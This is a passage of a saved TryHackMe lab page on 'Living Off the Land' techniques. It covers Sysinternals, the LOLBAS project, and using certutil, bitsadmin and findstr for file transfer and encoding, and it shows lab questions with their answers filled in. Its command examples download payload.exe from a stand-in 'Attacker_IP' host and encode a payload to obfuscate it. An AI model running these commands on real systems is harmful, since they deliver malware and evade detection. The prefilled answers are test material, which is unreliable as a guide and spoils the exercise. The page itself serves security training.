style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">\\live.sysinternals.com\tools</span><span style="font-size:1rem">&nbsp;into Windows Explorer.</span></p><p style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><br></p><p style="text-align:center"><img src="./TryHackMe _ Living Off the Land_files/75af3683c5d9263c66c2ca4a9cb23a6f.png"><span style="font-size:1rem"><br></span></p><p><span style="font-size:1rem;font-weight:bolder">Note&nbsp;</span><span style="font-size:1rem"><span>that since the attached <a class="dC9PH5rb glossary-term" onclick="initPopOver(&#39;VM&#39;, &#39;dC9PH5rb&#39;)">VM</a> does not have internet access, we pre-downloaded the Sysinternal tools in&nbsp;</span></span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">C:\Tools\</span><span style="font-size:1rem">.</span></p><div class="terminal-container">
	<div class="terminal-content">
		<div class="terminal-top">Command Prompt</div>
		<pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token output">C:\Users\thm&gt; C:\Tools\SysinternalsSuite\PsExec64.exe</span></code>
	    </pre></div></div>
<p></p><p><span style="font-size:1rem">If you are interested in learning more about Windows Sysinternals, </span>we suggest to familiarize yourself with the following additional resources<span style="font-size:1rem">:</span></p><ol><li>TryHackMe room: <a href="https://tryhackme.com/room/btsysinternalssg" target="_blank">Sysinternals</a>.</li><li>Microsoft Sysinternals Resources <a href="https://docs.microsoft.com/en-us/sysinternals/resources/" target="_blank">website</a>.</li></ol><p style="text-align:justify"><img src="./TryHackMe _ Living Off the Land_files/e983e3743e86872540374d33a13cfb7b.png" style="float:right;width:345.752px;height:245.297px" class="note-float-right"></p><p><span style="font-size:24px">Red Team utilization and benefits</span><br></p><p style="text-align:center"></p><p style="text-align:center"></p><p style="text-align:justify"><span style="font-size:1rem">&nbsp;built-in and Sysinternals tools are helpful for system administrators, these tools are also used by hackers, malware, and pentesters due to the inherent trust they have within the operating system. This trust is beneficial to Red teamers, who do not want to get detected or caught by any security control on the target system. Therefore, these tools have been used to evade detection and other blue team controls.&nbsp;</span></p><p style="text-align:justify">Remember that due to the increase of adversaries and malware creators using these tools nowadays, the blue team is aware of the malicious usage and has implemented defensive controls against most of them.<br></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Read the above!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-3">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse3">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 3                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> LOLBAS Project
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse3" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p></p><p></p><p></p><p></p><p style="text-align:left"><span style="font-size:24px">What is&nbsp;LOLBAS?</span></p><p style="text-align:center"><img src="./TryHackMe _ Living Off the Land_files/aa5cd3489ac1c2a6c315d637bf4ba8ce.png" style="width:25%"><br></p><p><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">LOLBAS stands for&nbsp;</span><strong>L</strong><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">iving&nbsp;</span><strong>O</strong><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">ff the&nbsp;</span><strong>L</strong><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">and&nbsp;</span><strong>B</strong><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">inaries&nbsp;</span><strong>A</strong><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">nd&nbsp;</span><strong>S</strong><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">cripts, a project's primary main goal is to gather and document the Microsoft-signed and built-in tools used as&nbsp; Living Off the Land techniques, including binaries, scripts, and libraries.</span></p><p><img src="./TryHackMe _ Living Off the Land_files/c98596d3c51c192ae9fd415ff06fc6b9.png"><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><br></span></p>
<p style="text-align:center"></p>
The LOLBAS project is a community-driven repository gathering a collection of&nbsp;binaries, scripts, libraries that could be used for red team purposes. It allows to search based on binaries, functions, scripts, and ATT&amp;CK info.&nbsp;The previous image shows what the LOLBAS project page looks like at this time. If you are interested in more details about the project, you may visit the project's website&nbsp;<a href="https://lolbas-project.github.io/" target="_blank">here</a>.<p></p><p><span style="font-size:1rem">The LOLBAS website provides a convenient search bar to query all available data. It is straightforward to look for a binary; including the binary name will show the result. However, if we want to look for a specific function, we require providing a&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">/</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">before the function name. For example, if we are looking for all execute functions, we should use&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">/execute</span><span style="font-size:1rem">.</span><span style="font-size:1rem">&nbsp;Similarly, in order to look based on types, we should use the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">#</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">symbol followed by the type name.&nbsp;</span><span style="font-size:1rem">The following are the types included in the project:</span><br></p><ul><li><span style="font-size:1rem">Script</span></li><li><span style="font-size:1rem">Binary</span></li><li><span style="font-size:1rem">Libraries</span></li><li>OtherMSBinaries</li></ul><p><span style="font-size:24px">Tools Criteria</span><br></p><p style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background-color:transparent;font-size:1rem">Specific criteria are required for a tool to be a "Living Off the Land" technique and accepted as part of the LOLBAS project:</span><br></p><ul style="background:transparent;margin-top:0pt;margin-bottom:0pt"><li style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background-color:transparent;font-size:1rem"><span>Microsoft-signed file native to the <a class="qOp33MMG glossary-term" onclick="initPopOver(&#39;OS&#39;, &#39;qOp33MMG&#39;)">OS</a> or downloaded from Microsoft.</span></span><br></li><li style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background-color:transparent;font-size:1rem">Having additional interesting unintended functionality not covered by known use cases.</span><br></li><li style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background-color:transparent;font-size:1rem"><span>Benefits an <a class="d9ZwMwbs glossary-term" onclick="initPopOver(&#39;APT&#39;, &#39;d9ZwMwbs&#39;)">APT</a> (Advanced Persistent Threat) or Red Team engagement.</span></span><br></li></ul><p style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background-color:transparent;font-size:1rem"><br></span></p><p style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background-color:transparent;font-size:1rem">Please note that if you find an exciting binary that adheres to the previously mentioned criteria, you may submit your finding by visiting the </span><a href="https://github.com/LOLBAS-Project/LOLBAS#criteria" target="_blank">GitHub repo contribution page</a><span style="background-color:transparent;font-size:1rem"> for more information.</span><br></p><p style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt"><br></span></p><p><span style="font-size:24px">Interesting Functionalities</span><br></p><p><span style="font-size:1rem">The LOLBAS project accepts tool submissions that fit one of the following functionalities:</span><br></p><ul><li>Arbitrary code execution</li><li>File operations, including downloading, uploading, and copying files.</li><li>Compiling code</li><li><span style="font-size:1rem">Persistence, including hiding data in Alternate Data Streams (ADS) or executing at logon.</span><br></li><li><span><a class="qvJoR8wP glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;qvJoR8wP&#39;)">UAC</a> bypass</span></li><li>Dumping process memory</li><li><span><a class="EtVgJ20h glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;EtVgJ20h&#39;)">DLL</a> injection</span></li></ul><p></p><p></p><p></p><p></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">Visit the&nbsp;</span><a target="_blank" href="https://lolbas-project.github.io/" class="editor-rtfLink">LOLBAS project's website</a><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">&nbsp;and check out its functionalities. Then, using the search bar, find the ATT&amp;CK ID:&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">T1040</span><span style="font-size:1rem">.</span><span style="background:transparent;font-size:1rem;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt">&nbsp;What is the binary's name?</span></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ******.***" value="Pktmon.exe" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-dorange faded btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Use the search bar to find more information about&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">MSbuild.exe</span><span style="font-size:1rem">. What is the ATT&amp;CK ID?</span></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *****.***" value="T1127.001" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Use the search bar to find more information about&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Scriptrunner.exe</span>. What is the function of the binary?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *******" value="Execute" disabled="">
                            <input type="hidden" value="3">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                In the next task, we will show some of the tools based on the functionalities! Let's go!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="4">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-4">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse4">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 4                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> File Operations
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse4" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p></p><p>This task shows commonly used tools based on functionalities and malware activities seen in the real world as well as in the red team engagements.</p><p><img src="./TryHackMe _ Living Off the Land_files/aa1be26f2bc06a324dc5debb1dab5dec.png" style="float:right;width:423.38px;height:240.297px" class="note-float-right" alt="files are being sent from one machine to another"></p><p></p><p>This task will highlight some interesting "Living Off the Land" techniques that aim to be used in a file operation, including download, upload, and encoding.</p><p><span style="font-size:24px">Certutil</span></p><p><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><span>Certutil is a Windows built-in utility for handling certification services. It is used to dump and display Certification Authority (CA) configuration information and other CA components. Therefore, the tool's normal use is to retrieve certificate information. However, people found that certutil.exe could transfer and encode files unrelated to certification services. The <a class="A9x6MvsV glossary-term" onclick="initPopOver(&#39;MITRE&#39;, &#39;A9x6MvsV&#39;)">MITRE</a> ATT&amp;CK framework identifies this technique&nbsp;as&nbsp;</span></span><strong>Ingress tool transfer</strong><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">&nbsp;(</span><a target="_blank" href="https://attack.mitre.org/techniques/T1105/" class="editor-rtfLink">T1105</a><span>).</span></p><p><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">To illustrate this with an example, we can use&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">certutil.exe</span><span style="font-size:1rem">&nbsp;</span>to download a file from an attacker's web server and store it in the Window's temporary folder, using the command below.</span><span style="font-size:1rem">&nbsp;Note that we use the</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">-urlcache</span><span style="font-size:1rem">&nbsp;and&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">-split -f</span><span style="font-size:1rem">&nbsp;parameters&nbsp;</span><span style="font-size:1rem">to enforce the tool to download from the provided URL using the split technique.</span></p>
<p>
</p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Command Prompt</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token output">certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe</span></code>
	    </pre></div></div>
<p></p>
<p><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">-urlcache</span><span style="font-size:1rem">&nbsp;to display URL, enables the URL option to use in the command<br></span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">-split -f&nbsp;</span><span style="font-size:1rem">&nbsp;to split and force fetching files from the provided URL.</span><br></p><p>Also, the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">certutil.exe</span><span style="font-size:1rem">&nbsp;can be used as an encoding tool where we can encode files and decode the content of files.&nbsp;</span><span style="background:transparent;font-size:1rem;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt">ATT&amp;CK&nbsp;</span><a target="_blank" href="https://attack.mitre.org/techniques/T1027/" class="editor-rtfLink">T1027</a><span style="background:transparent;font-size:1rem;color:rgb(14, 16, 26);margin-top:0pt;margin-bottom:0pt">&nbsp;refers to this technique to obfuscate files to make them difficult to discover or analyze.</span></p>
<p>
</p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Command Prompt</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token output">C:\Users\thm&gt; certutil -encode payload.exe Encoded-payload.txt</span></code>
	    </pre></div></div>
<p></p>


<p>For more information about the tool, you may visit the Microsoft Document here<span style="font-size:1rem">:&nbsp;</span><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil" target="_blank">Microsoft Docs: CertUtil</a></p><p><span style="font-size:24px">BITSAdmin</span></p><p>The&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">bitsadmin</span><span style="font-size:1rem">&nbsp;tool&nbsp;</span><span style="font-size:1rem">is a system administrator utility that can be used to create, download or upload </span>Background Intelligent Transfer Service (BITS)&nbsp;<span style="font-size:1rem">jobs and check their progress. <a href="https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal" target="_blank">BITS </a><span>is a low-bandwidth and asynchronous method to download and upload files from <a class="8jmMJPxI glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;8jmMJPxI&#39;)">HTTP</a> webservers and SMB servers. Additional information about the&nbsp;</span></span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">bitsadmin</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">tool can be found at&nbsp;</span><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin" target="_blank">Microsoft Docs</a><span style="font-size:1rem">.</span></p><p>Attackers may abuse the BITS jobs to download and execute a malicious payload in a compromised machine. For more information about this technique, you may visit the ATT&amp;CK&nbsp;<a href="https://attack.mitre.org/techniques/T1197/" target="_blank">T1197</a>&nbsp;page.</p><p>Introduce the terminal container content (revisit)<br></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Command Prompt</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token output">C:\Users\thm&gt;bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe</span></code>	    </pre></div></div><p><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">/Transfer</span><span style="font-size:1rem">&nbsp;</span>to use the transfer option<br><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">/Download</span><span style="font-size:1rem">&nbsp;</span>we are specifying transfer using download type<br><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">/Priority</span><span style="font-size:1rem">&nbsp;</span>we are setting the priority of the job to be running in the foreground</p><p>For more information about the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">bitsadmin</span><span style="font-size:1rem">&nbsp;</span>parameters, you can visit the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-transfer" target="_blank">Microsoft documentation</a> of the tool.</p>
<p></p><p><span style="font-size:24px">FindStr</span></p><p style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr" target="_blank">Findstr</a><span style="background:transparent;margin-top:0pt;margin-bottom:0pt"><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr" target="_blank">&nbsp;</a>is a Microsoft built-in tool used to find text and string patterns in files. The findstr tool is useful in that helps users and system administrators to search within files or parsed output. For example, if we want to check whether port 8080 is open on our machine, then we can pipe the result of netstat to find that port as follows:&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">netstat -an| findstr "445"</span><span style="color:rgb(33, 37, 41);font-size:1rem">.</span></p><p style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt"><br></span></p><p style="background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">However, an unintended way was found by using&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">findstr.exe</span><span style="font-size:1rem">&nbsp;</span><span>to download remote files from <a class="2s7fuC9Q glossary-term" onclick="initPopOver(&#39;SMB&#39;, &#39;2s7fuC9Q&#39;)">SMB</a> shared folders within the network as follows</span></span><span style="background-color:transparent;font-size:1rem;color:rgb(14, 16, 26)">,</span></p>


<p>
</p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Command Prompt</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token output">C:\Users\thm&gt;findstr /V dummystring \\MachineName\ShareFolder\test.exe &gt; c:\Windows\Temp\test.exe</span></code>
	    </pre></div></div>
<p></p>

<p style="background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt"><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">/V</span><span style="font-size:1rem">&nbsp;</span>to print out the lines that don't contain the string provided.</span></p><p style="background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt"><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">dummystring</span><span style="font-size:1rem">&nbsp;</span>the text to be searched for; in this case, we provide a string that must not be found in a file.</span></p><p style="background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt"><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">&gt; c:\Windows\Temp\test.exe</span><span style="font-size:1rem">&nbsp;redirect the output to a file on the target machine.&nbsp;</span><span style="font-size:1rem"><br></span><br></span></p>
<p><span style="font-size:1rem">Note that other tools can be used for the file operation. We suggest visiting the&nbsp;</span><span style="color:rgb(14, 16, 26)"><a href="https://lolbas-project.github.io/" target="_blank">LOLBAS</a></span><span style="font-size:1rem"><a href="https://lolbas-project.github.io/" target="_blank">&nbsp;</a>project to check them out.</span></p><p><span style="font-size:1rem">In the next task, we will introduce some of the tools used to execute files.</span></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Run&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">bitsadmin.exe</span><span style="font-size:1rem"><span>&nbsp;to download a file of your choice onto the attached Windows <a class="8d3BebCy glossary-term" onclick="initPopOver(&#39;VM&#39;, &#39;8d3BebCy&#39;)">VM</a>. Once you have executed the command&nbsp;</span></span><span style="font-size:1rem">successfully</span><span style="font-size:1rem">, an encoded flag file will be created automatically on the Desktop. </span><b style="font-size:1rem">What is the file name?</b></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ********************.***" value="enc_thm_0YmFiOG_file.txt" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="4">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-dorange faded btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>
Use the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">certutil.exe</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">tool to decode the encoded flag file from <b>question #1</b>.

